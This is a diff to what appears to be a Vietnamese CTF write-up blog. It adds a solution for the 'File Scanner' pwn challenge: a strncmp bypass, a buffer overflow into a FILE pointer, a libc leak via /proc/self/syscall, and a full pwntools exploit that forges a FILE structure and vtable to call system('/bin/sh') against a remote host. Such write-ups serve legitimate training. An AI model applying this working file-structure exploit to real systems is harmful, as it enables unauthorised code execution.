@@ -329,7 +329,7 @@ Flag thu được là `BKSEC{C0nGratul4t31}`
 
 {{< admonition note "Challenge Information" >}}
 * **Given files:** [reality.zip](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EYE-JsOfHUlLn3eLktQ-CXIB5e-4J0AhnZoM9qHwfNqGdA?e=Phj3TB)
-* **Difficulty:** Easy
+* **Difficulty:** Medium
 * **Description:** A simple reversing challenge... Flag format: `BKSEC{}`
 {{< /admonition >}}
 
@@ -408,3 +408,109 @@ Flag thu được là `BKSEC{e4sy_ch4ll_but_th3r3_must_b3_som3_ant1_debug??}`
 **Solution**
 
 Updating ... 
+
+## pwn/File Scanner
+
+{{< admonition note "Challenge Information" >}}
+* **Given files:** [bkctf2023-file-scanner.zip](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EZ9OTXN0q9FOip0-58L7HfABRbHe_ozK_7abZoFk8uVsQQ?e=ooSD6Y)
+* **Difficulty:** Medium
+* **Description:** The most powerful tool maybe the worst :(. Flag format: `BKSEC{}`
+{{< /admonition >}}
+
+**Solution**
+
+Chương trình tạo 1 số random 16 byte và bắt chúng ta phải nhập chính xác số random đó. 
+
+```c
+v3 = time(0);
+  srand(v3);
+  for ( i = 0; i <= 15; ++i )
+    s2[i] = generateRandomHexValue();
+  memset(s, 0, sizeof(s));
+  printf("Are you Huster? Show me your ID: ");
+  custom_read(s);
+  n = strlen(s);
+  if ( strncmp(s, s2, n) )
+  {
+    printf("Do you forgot your ID, so badd !!!");
+    exit(1);
+  }
+  puts("Ohh... so you can use the newest tool I just found");
+  puts("Please don't break my program T_T\n");
+```
+
+Ta hoàn toàn có thể bypass hàm `strncmp` với input `\n`. 
+
+Dễ thấy ý đồ của tác giả là muốn sử dụng kỹ thuật File Structure Attack. Ở option 4, chương trình có bug BOF như sau 
+
+```c
+puts("oh... I forgot asking your name");
+printf("What is your name: ");
+__isoc99_scanf("%s", name);
+printf("See you soon, %s !!!\n", name);
+if ( filePtr )
+fclose(filePtr);
+exit(1);
+```
+
+Từ biến `name`, ta hoàn toàn overwrite được `filePtr` lẫn `fileContent`. Vậy mình hoàn toàn fake được `file structure` và `vtable` sao cho toàn bộ hàm trong `vtable` đều là `system`. 
+
+<img src="15.png"/>
+
+Để leak được `libc`, chúng ta có thể mở `/proc/self/maps` hoặc `/proc/self/syscall`. 
+
+Full exploit 
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./file_scanner_patched", checksec = False)
+libc = ELF("./libc_32.so.6", checksec = False)
+ld = ELF("./ld-2.23.so", checksec = False)
+
+context.update(os = "linux", arch = "amd64", log_level = "debug", terminal = "cmd.exe /c start wsl".split(), binary = exe)
+
+# p = process(exe.path)
+p = remote("103.97.125.56", 31381)
+
+sl  = p.sendline
+sa  = p.sendafter
+sla = p.sendlineafter
+rl  = p.recvline
+ru  = p.recvuntil
+
+sla(b"ID: ", "") 
+
+# open /proc/self/syscall 
+sla(b"choice :", b"1")
+sla(b"filename: ", b"/proc/self/syscall")
+sla(b"choice :", b"2")
+sla(b"choice :", b"3")
+
+libc_leak = int(rl().strip()[-10::], 16)
+libc_base = libc_leak - 0x1ba549
+system = libc_base + libc.symbols["system"] 
+
+log.info(f"libc base = {hex(libc_base)}")
+log.info(f"libc leak = {hex(libc_leak)}")
+log.info(f"system = {hex(system)}")
+
+sla(b"choice :", b"4")
+
+file = FileStructure()
+file.flags = u32(b"/bin")
+file._IO_read_ptr = u32(b"/sh\x00") 
+file._lock = 0x804b250
+file.vtable = 0x804b178
+binsh = 0x804b0e0
+
+payload = b"A" * 0x20 + p32(binsh) + b"B" * 28 + bytes(file) + p32(system) * 21
+
+sla(b"name: ", payload)
+
+p.interactive() 
+```
+
+Flag của bài toán là `BKSEC{fSoP_1s_n0t_2_hArd_4_u_d4e2411f244126da3242265c90e10c46}`
